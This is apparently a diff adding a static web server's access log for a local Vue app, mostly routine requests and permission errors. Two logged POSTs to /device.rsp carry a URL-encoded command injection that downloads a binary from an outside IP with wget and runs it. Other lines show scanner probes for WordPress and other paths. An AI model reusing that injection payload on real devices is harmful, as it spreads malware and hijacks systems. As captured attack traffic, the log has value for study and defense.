@@ -1,0 +1,117 @@
+ INFO  Accepting connections at http://localhost:4100
+ HTTP  16.04.2026 00:20:31 192.168.2.1 GET /
+ HTTP  16.04.2026 00:20:31 192.168.2.1 Returned 200 in 15 ms
+ HTTP  16.04.2026 00:20:31 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:20:31 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:20:31 192.168.2.1 Returned 200 in 2 ms
+ HTTP  16.04.2026 00:20:31 192.168.2.1 Returned 200 in 4 ms
+ HTTP  16.04.2026 00:20:35 192.168.2.1 GET /
+ HTTP  16.04.2026 00:20:35 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:20:35 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:20:35 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:20:35 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:20:35 192.168.2.1 Returned 304 in 2 ms
+ HTTP  16.04.2026 00:23:37 212.47.78.118 GET /
+ HTTP  16.04.2026 00:23:37 212.47.78.118 Returned 200 in 1 ms
+ HTTP  16.04.2026 00:23:37 212.47.78.118 GET /wp-includes/css/buttons.css
+ HTTP  16.04.2026 00:23:37 212.47.78.118 Returned 200 in 2 ms
+ HTTP  16.04.2026 00:23:37 212.47.78.118 GET /media/system/js/core.js
+ HTTP  16.04.2026 00:23:37 212.47.78.118 Returned 200 in 2 ms
+ HTTP  16.04.2026 00:23:54 185.34.144.224 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F156.229.165.225%2Falyssaaarm7%3B%20chmod%20777%20%2A%3B%20.%2Falyssaaarm7%20
+ HTTP  16.04.2026 00:23:54 185.34.144.224 Returned 200 in 2 ms
+ HTTP  16.04.2026 00:26:56 192.168.2.1 GET /
+ HTTP  16.04.2026 00:26:56 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:26:56 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:26:56 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:26:56 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:26:56 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:00 192.168.2.1 GET /
+ HTTP  16.04.2026 00:27:00 192.168.2.1 Returned 304 in 0 ms
+ HTTP  16.04.2026 00:27:00 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:27:00 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:27:00 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:00 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:09 192.168.2.1 GET /video
+ HTTP  16.04.2026 00:27:09 192.168.2.1 Returned 200 in 1 ms
+ HTTP  16.04.2026 00:27:09 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:27:09 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:27:09 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:09 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:53 192.168.2.1 GET /
+ HTTP  16.04.2026 00:27:53 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:53 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:27:53 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:27:53 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:53 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:57 192.168.2.1 GET /
+ HTTP  16.04.2026 00:27:57 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:57 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:27:57 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:27:57 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:57 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:27:58 127.0.0.1 GET /
+ HTTP  16.04.2026 00:27:58 127.0.0.1 Returned 200 in 1 ms
+ HTTP  16.04.2026 00:28:05 127.0.0.1 GET /bobr
+ HTTP  16.04.2026 00:28:05 127.0.0.1 Returned 200 in 0 ms
+ HTTP  16.04.2026 00:28:14 192.168.2.1 GET /video
+ HTTP  16.04.2026 00:28:14 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:28:14 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:28:14 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:28:14 192.168.2.1 Returned 304 in 0 ms
+ HTTP  16.04.2026 00:28:14 192.168.2.1 Returned 304 in 0 ms
+ HTTP  16.04.2026 00:28:18 192.168.2.1 GET /assets/bobr-DEePSR1h.jpg
+ HTTP  16.04.2026 00:28:18 192.168.2.1 Returned 304 in 2 ms
+ HTTP  16.04.2026 00:28:19 192.168.2.1 GET /bobr
+ HTTP  16.04.2026 00:28:19 192.168.2.1 Returned 200 in 1 ms
+ HTTP  16.04.2026 00:28:19 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:28:19 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:28:19 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:28:19 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:28:19 192.168.2.1 GET /assets/bobr-DEePSR1h.jpg
+ HTTP  16.04.2026 00:28:19 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:28:22 192.168.2.1 GET /
+ HTTP  16.04.2026 00:28:22 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:28:22 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:28:22 192.168.2.1 GET /assets/index-DdsR9YBl.css
+ HTTP  16.04.2026 00:28:22 192.168.2.1 Returned 304 in 2 ms
+ HTTP  16.04.2026 00:28:22 192.168.2.1 Returned 304 in 1 ms
+ HTTP  16.04.2026 00:30:35 20.29.21.208 GET /developmentserver/metadatauploader
+ HTTP  16.04.2026 00:30:35 20.29.21.208 Returned 200 in 1 ms
+ HTTP  16.04.2026 00:31:14 192.168.2.1 GET /
+ HTTP  16.04.2026 00:31:14 192.168.2.1 Returned 304 in 0 ms
+ HTTP  16.04.2026 00:31:14 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:31:14 192.168.2.1 GET /assets/index-DdsR9YBl.css
+[Error: EPERM: operation not permitted, lstat 'C:\Users\user\vue-hello-world\dist\assets\index-D8qjGadh.js'] {
+  errno: -4048,
+  code: 'EPERM',
+  syscall: 'lstat',
+  path: 'C:\\Users\\user\\vue-hello-world\\dist\\assets\\index-D8qjGadh.js'
+}
+[Error: EPERM: operation not permitted, lstat 'C:\Users\user\vue-hello-world\dist\assets\index-DdsR9YBl.css'] {
+  errno: -4048,
+  code: 'EPERM',
+  syscall: 'lstat',
+  path: 'C:\\Users\\user\\vue-hello-world\\dist\\assets\\index-DdsR9YBl.css'
+}
+ HTTP  16.04.2026 00:31:14 192.168.2.1 Returned 500 in 3 ms
+ HTTP  16.04.2026 00:31:14 192.168.2.1 Returned 500 in 3 ms
+ HTTP  16.04.2026 00:31:16 192.168.2.1 GET /
+ HTTP  16.04.2026 00:31:16 192.168.2.1 Returned 304 in 0 ms
+ HTTP  16.04.2026 00:31:16 192.168.2.1 GET /assets/index-D8qjGadh.js
+ HTTP  16.04.2026 00:31:16 192.168.2.1 GET /assets/index-DdsR9YBl.css
+[Error: EPERM: operation not permitted, lstat 'C:\Users\user\vue-hello-world\dist\assets\index-D8qjGadh.js'] {
+  errno: -4048,
+  code: 'EPERM',
+  syscall: 'lstat',
+  path: 'C:\\Users\\user\\vue-hello-world\\dist\\assets\\index-D8qjGadh.js'
+}
+[Error: EPERM: operation not permitted, lstat 'C:\Users\user\vue-hello-world\dist\assets\index-DdsR9YBl.css'] {
+  errno: -4048,
+  code: 'EPERM',
+  syscall: 'lstat',
+  path: 'C:\\Users\\user\\vue-hello-world\\dist\\assets\\index-DdsR9YBl.css'
+}
+ HTTP  16.04.2026 00:31:16 192.168.2.1 Returned 500 in 1 ms
+ HTTP  16.04.2026 00:31:16 192.168.2.1 Returned 500 in 1 ms
+ HTTP  16.04.2026 00:45:02 185.34.144.224 POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F156.229.165.225%2Falyssaaarm7%3B%20chmod%20777%20%2A%3B%20.%2Falyssaaarm7%20
+ HTTP  16.04.2026 00:45:02 185.34.144.224 Returned 200 in 1 ms
